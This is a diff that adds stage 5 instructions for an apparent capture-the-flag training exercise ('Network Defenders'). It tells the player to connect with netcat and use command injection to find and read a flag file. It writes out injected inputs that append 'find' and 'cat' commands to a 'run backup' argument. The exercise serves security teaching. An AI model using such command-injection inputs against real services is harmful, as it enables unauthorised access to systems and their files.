@@ -1,0 +1,33 @@
+================== STAGE 5: FLAG CAPTURE ==================
+
+OBJECTIVE: 
+Locate and retrieve the final flag file.
+
+INSTRUCTIONS:
+1. Connect to the service on port 4444 using netcat
+2. Use your command injection capability to locate and read the flag
+
+COMMANDS:
+  $ nc defense-service 4444
+  
+Once connected:
+  > login admin [password]       (use the credentials from Stage 3)
+  > run backup; find / -name '*flag*' 2>/dev/null   (search for flag files)
+  > run backup; cat /path/to/flag                   (read the flag file)
+
+EXPECTED OUTCOME:
+You should be able to locate and retrieve the flag value from a file on the
+system. This is the final objective of the challenge.
+
+HINTS:
+- The flag is likely in a file with "flag" in its name
+- Common locations: /root/, /flags/, /opt/flag
+- Use the find command to search the filesystem
+- Try: find / -name '*flag*' 2>/dev/null
+- Once you find a potential flag file, use cat to read it
+- The flag format will be: flag{...}
+
+CONGRATULATIONS on completing the Network Defenders challenge!
+When you capture the flag, be sure to submit it to your instructor.
+
+================================================================ 
